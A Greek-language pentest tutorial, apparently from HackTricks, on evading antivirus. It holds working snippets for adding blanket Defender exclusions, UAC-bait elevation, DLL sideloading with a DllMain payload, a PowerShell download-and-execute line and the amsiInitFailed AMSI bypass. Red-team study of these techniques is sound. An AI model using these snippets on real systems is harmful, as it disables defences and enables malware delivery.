# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Εργαλείο για να σταματά τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Εργαλείο για να σταματά τη λειτουργία του Windows Defender, προσποιούμενο ότι είναι άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Δόλωμα UAC τύπου installer πριν από την παραποίηση του Defender

Δημόσια loaders που μεταμφιέζονται συχνά σε cheats παιχνιδιών διανέμονται ως unsigned installers βασισμένα σε Node.js/Nexe, οι οποίοι πρώτα **ζητούν από τον χρήστη αυξημένα δικαιώματα** και μόνο έπειτα εξουδετερώνουν το Defender. Η διαδικασία είναι απλή:

1. Ελέγχει αν το περιβάλλον έχει δικαιώματα διαχειριστή με την εντολή `net session`. Η εντολή πετυχαίνει μόνο όταν ο χρήστης διαθέτει δικαιώματα admin, επομένως η αποτυχία υποδεικνύει ότι ο loader εκτελείται ως τυπικός χρήστης.
2. Επανεκκινεί αμέσως τον εαυτό του με το ρήμα `RunAs` για να εμφανίσει το αναμενόμενο μήνυμα επιβεβαίωσης UAC, διατηρώντας την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν «σπασμένο» λογισμικό, οπότε συνήθως αποδέχονται την προτροπή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσουν αυξημένα δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender αντί να απενεργοποιούν εντελώς την υπηρεσία. Ο loader πρώτα τερματίζει τη διεργασία GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην μπορούν να σαρωθούν όλα τα προφίλ χρηστών, οι κατάλογοι συστήματος και οι αφαιρούμενοι δίσκοι:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks κ.λπ.), επομένως **κάθε μελλοντικό payload που τοποθετείται οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προνοητικός — οι επιτιθέμενοι διατηρούν την επιλογή να φορτώσουν αργότερα unsigned drivers χωρίς να χρειαστεί να πειράξουν ξανά το Defender.
- Όλες οι αλλαγές καταχωρίζονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας στα επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Καθώς δεν διακόπτεται καμία υπηρεσία του Defender, οι επιφανειακοί έλεγχοι κατάστασης εξακολουθούν να αναφέρουν «antivirus active», παρόλο που η επιθεώρηση σε πραγματικό χρόνο δεν ελέγχει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **Μεθοδολογία AV Evasion**

Σήμερα, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγχουν αν ένα αρχείο είναι κακόβουλο ή όχι: στατική ανίχνευση, δυναμική ανάλυση και, για τα πιο προηγμένα EDR, συμπεριφορική ανάλυση.

### **Στατική ανίχνευση**

Η στατική ανίχνευση επιτυγχάνεται με τον εντοπισμό γνωστών κακόβουλων strings ή σειρών από bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, ψηφιακές υπογραφές, εικονίδιο, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να παρακάμψετε αυτό το είδος ανίχνευσης:

- **Κρυπτογράφηση**

Αν κρυπτογραφήσετε το binary, το AV δεν θα μπορεί να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να το αποκρυπτογραφήσει και να εκτελέσει το πρόγραμμα στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξετε ορισμένα strings στο binary ή στο script σας για να το παρακάμψετε το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακόβουλες υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε τη στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλαπλά τμήματα και ζητά από το Defender να σαρώσει καθένα ξεχωριστά, ώστε να σας δείξει ακριβώς ποια strings ή bytes στο binary σας επισημαίνονται.

Σας συνιστώ ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτικό AV Evasion.

### Offline δοκιμές χαρακτηριστικών PE για στατικούς classifiers

Τα bytes ενός packed ή κρυπτογραφημένου payload είναι μόνο μία από τις εισόδους ενός στατικού classifier. Το EMBER2024 εξάγει χαρακτηριστικά PE, μεταξύ των οποίων imports, exports, sections, headers και δεδομένα Authenticode.<sup>[[48]](#references)</sup> Σε ένα πείραμα με loader, η προσθήκη 141 imports που έμοιαζαν αβλαβή μείωσε το malicious score του EMBER2024 κατά 93%, ενώ imports που συσχετίζονται με malware το αύξησαν. Αυτό είναι αποτέλεσμα για το συγκεκριμένο μοντέλο και τα συγκεκριμένα δείγματα, όχι αξιόπιστη παράκαμψη κάποιου συγκεκριμένου προϊόντος AV/EDR.<sup>[[50]](#references)</sup>

Για μια εξουσιοδοτημένη δοκιμή loader, διατηρήστε σταθερά το payload και τη διαδρομή εκτέλεσης, αλλάξτε μία προβλεπόμενη μεταβλητή build ανά παραλλαγή και συγκρίνετε τα scores offline. Εξετάστε τα χαρακτηριστικά PE που προκύπτουν, καθώς μια αλλαγή στο build μπορεί να επηρεάσει περισσότερες από μία ομάδες χαρακτηριστικών.<sup>[[49]](#references)[[50]](#references)</sup> Για να διατηρήσετε τα προβλεπόμενα imports στο IAT, καλέστε τα επιλεγμένα Win32 APIs από προσβάσιμο κώδικα. Μεταβάλλετε την επιλογή και κατανείμετε τα σημεία κλήσης σε διαφορετικά builds, αντί να δημιουργήσετε μια σταθερή camouflage function που μπορεί να γίνει signature. Το πείραμα ανέφερε επίσης χαμηλότερα scores με έγκυρη code signing, export entries και περισσότερες functions που μεγαλώνουν το `.pdata`· η μη έγκυρη υπογραφή είχε μικρή επίδραση, όπως και η επίδραση του `.pdata`.<sup>[[50]](#references)</sup>

Το package `thrember` παρέχει εξαγωγή χαρακτηριστικών και benchmark models. Αφού το εγκαταστήσετε, χρησιμοποιήστε το `thrember.download_models("models")` με έναν υπάρχοντα φάκελο `models` και, στη συνέχεια, εκτελέστε τον scorer από τον γονικό του φάκελο: το helper λήψης αλλάζει τον τρέχοντα φάκελο εργασίας. Ο PE classifier μπορεί να υπολογίσει score για έναν φάκελο με builds χωρίς να τα υποβάλει σε υπηρεσία σάρωσης:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Κρατήστε σταθερές τις εκδόσεις του model και του feature extractor κατά τη σύγκριση. Μια χαμηλότερη offline βαθμολογία δείχνει μόνο πώς αντιδρά αυτός ο classifier στο τροποποιημένο binary· δεν αποδεικνύει αποφυγή του behavioral analysis, του emulation ή ενός διαφορετικού model κάποιου vendor.<sup>[[49]](#references)[[50]](#references)</sup> Για [polymorphism ανά build και camouflage του εξωτερικού binary σε virtualized payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), δείτε το ξεχωριστό execution model.

### **Dynamic analysis**

Dynamic analysis είναι όταν το AV εκτελεί το binary σας σε sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. απόπειρα αποκρυπτογράφησης και ανάγνωσης των passwords του browser σας, δημιουργία minidump του LSASS κ.λπ.). Αυτό το κομμάτι μπορεί να είναι λίγο πιο περίπλοκο, αλλά παρακάτω θα δείτε μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με την υλοποίηση, μπορεί να είναι ένας πολύ καλός τρόπος να παρακάμψετε το dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία, ώστε να μην εμποδίζουν τη ροή εργασιών του χρήστη, επομένως οι μεγάλες αναμονές μπορούν να διαταράξουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παρακάμψουν την αναμονή, ανάλογα με την υλοποίησή της.
- **Έλεγχος των πόρων του μηχανήματος** Συνήθως τα sandboxes διαθέτουν πολύ λίγους πόρους (π.χ. < 2GB RAM), διαφορετικά μπορεί να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις ταχύτητες των ανεμιστήρων· δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Έλεγχοι ειδικοί για το μηχάνημα** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή και να δείτε αν αντιστοιχεί σε αυτό που έχετε ορίσει. Αν δεν αντιστοιχεί, μπορείτε να τερματίσετε το πρόγραμμά σας.

Αποδεικνύεται ότι το όνομα υπολογιστή του Microsoft Defender's Sandbox είναι HAL9TH. Έτσι, μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την εκτέλεση. Αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του Defender, οπότε μπορείτε να τερματίσετε το πρόγραμμά σας.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμα πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως έχουμε ήδη αναφέρει σε αυτή την ανάρτηση, τα **public tools** αργά ή γρήγορα **θα εντοπιστούν**, οπότε θα πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα λιγότερο γνωστό project που επίσης κάνει dump το LSASS;

Η σωστή απάντηση είναι μάλλον η δεύτερη. Αν πάρουμε το mimikatz ως παράδειγμα, είναι πιθανότατα ένα από τα malware που επισημαίνονται συχνότερα από τα AV και EDR, αν όχι το συχνότερα επισημασμένο. Παρότι το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AV, οπότε απλώς αναζητήστε εναλλακτικές για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων** στο Defender και, σας παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν στόχος σας είναι να πετύχετε evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν ένα συγκεκριμένο AV εντοπίζει το payload σας, εγκαταστήστε το σε VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs έναντι DLLs

Όποτε είναι δυνατό, **προτιμάτε πάντα τη χρήση DLLs για evasion**. Από την εμπειρία μου, τα DLL files συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε αυτό είναι ένα πολύ απλό τέχνασμα για να αποφύγετε τον εντοπισμό σε ορισμένες περιπτώσεις (αν το payload σας μπορεί να εκτελεστεί ως DLL, φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό εντοπισμού 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό εντοπισμού 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά τεχνάσματα που μπορείτε να χρησιμοποιήσετε με DLL files για να γίνετε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-στόχο και τα κακόβουλα payload(s) στον ίδιο φάκελο.

Μπορείτε να εντοπίσετε προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων μέσα στο "C:\Program Files\\" που είναι ευάλωτα σε DLL hijacking, καθώς και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που επιτρέπουν DLL Hijacking/Sideloading**. Αν γίνει σωστά, αυτή η τεχνική είναι αρκετά stealthy, αλλά αν χρησιμοποιήσετε δημόσια γνωστά προγράμματα που επιτρέπουν DLL Sideloading, μπορεί να εντοπιστείτε εύκολα.

Η απλή τοποθέτηση ενός κακόβουλου DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα περιμένει να βρει συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) του [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό DLL μετονομασμένο.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και [το βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα και σε μεγαλύτερο βάθος για όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να εξάγουν συναρτήσεις που είναι στην πραγματικότητα «forwarders»: αντί να δείχνει σε κώδικα, η καταχώριση export περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader θα:

- Φορτώσει το `TargetDll`, αν δεν έχει ήδη φορτωθεί
- Επιλύσει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο χώρο ονομάτων KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον φάκελο του module που εκτελεί την επίλυση του forward.

Αυτό επιτρέπει μια έμμεση primitive sideloading: εντοπίστε ένα υπογεγραμμένο DLL που εξάγει μια συνάρτηση η οποία προωθείται σε όνομα module που δεν είναι KnownDLL και, στη συνέχεια, τοποθετήστε αυτό το υπογεγραμμένο DLL στον ίδιο φάκελο με ένα DLL που ελέγχει ο επιτιθέμενος και έχει ακριβώς το όνομα του module-στόχου της προώθησης. Όταν γίνει κλήση στο forwarded export, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο φάκελο, εκτελώντας το DllMain σας.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (αντιγραφή και επικόλληση):
1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο `DllMain` αρκεί για code execution· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- Το rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα εμφανιστεί σφάλμα «missing API» μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Hunting tips:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το inventory των forwarder στα Windows 11 για να αναζητήσετε υποψήφια: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για ανίχνευση/άμυνα:
- Παρακολουθείτε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν υπογεγραμμένα DLL από διαδρομές εκτός συστήματος και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο βασικό όνομα από αυτόν τον κατάλογο
- Δημιουργήστε ειδοποίηση για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από τον χρήστη
- Επιβάλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε την εγγραφή και εκτέλεση στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealth τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού· ό,τι λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο, γι’ αυτό μην βασίζεστε ποτέ σε ένα μόνο εργαλείο και, αν είναι δυνατό, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Τα EDR συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: εκπέμπει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (δεν γίνεται hit σε export του `ntdll`).
- **Indirect**: πραγματοποιεί jump σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion)· το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε κλήση.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο· επιλύει μια syscall sequence κατά το runtime.

**Στρατηγικές επίλυσης SSN με αντοχή σε hooks:**
- **FreshyCalls (VA sort)**: συνάγει SSN ταξινομώντας τα syscall stubs με βάση τις virtual addresses, αντί να διαβάζει τα bytes των stubs.
- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSN από το `.text` και έπειτα κάνει unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάζει τη συναγωγή SSN με ταξινόμηση VA και την επικύρωση opcode όταν ένα stub είναι καθαρό· αν έχει hook, χρησιμοποιεί εναλλακτικά τη συναγωγή VA.
- **HW Breakpoint**: ορίζει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά το runtime, χωρίς να αναλύει hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέπει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώνουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα εξής στοιχεία των Windows:

- User Account Control ή UAC (ανύψωση δικαιωμάτων για εγκατάσταση EXE, COM, MSI ή ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Μακροεντολές Office VBA

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μη κρυπτογραφημένη και μη συσκοτισμένη μορφή.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατήρησε πώς προσθέτει το `amsi:` και στη συνέχεια τη διαδρομή προς το εκτελέσιμο αρχείο από το οποίο εκτελέστηκε το script, στην προκειμένη περίπτωση, το powershell.exe.

Δεν αποθηκεύσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και τη φόρτωση κώδικα στη μνήμη μέσω του `Assembly.Load(byte[])`. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για εκτέλεση στη μνήμη, αν θέλεις να παρακάμψεις το AMSI.

Υπάρχουν μερικοί τρόποι παράκαμψης του AMSI:

- **Obfuscation**

Καθώς το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείς να φορτώσεις μπορεί να είναι ένας καλός τρόπος αποφυγής του εντοπισμού.

Ωστόσο, το AMSI μπορεί να αποσυσκοτίσει scripts ακόμη κι αν έχουν πολλά επίπεδα, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο που εφαρμόζεται. Αυτό σημαίνει ότι η αποφυγή εντοπισμού δεν είναι και τόσο απλή. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξεις μερικά ονόματα μεταβλητών, οπότε αυτό εξαρτάται από το πόσο έχει επισημανθεί κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται φορτώνοντας ένα DLL στη διεργασία powershell (καθώς και στις cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να αλλοιωθεί ακόμη και από μη προνομιούχο χρήστη. Λόγω αυτού του ελαττώματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους αποφυγής της σάρωσης AMSI.

**Εξαναγκασμός σφάλματος**

Αν εξαναγκαστεί η αποτυχία αρχικοποίησης του AMSI (amsiInitFailed), δεν θα ξεκινήσει σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation), και η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει την ευρύτερη χρήση του.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα PowerShell για να καταστήσει το AMSI μη λειτουργικό στην τρέχουσα διεργασία PowerShell. Αυτή η γραμμή έχει φυσικά εντοπιστεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

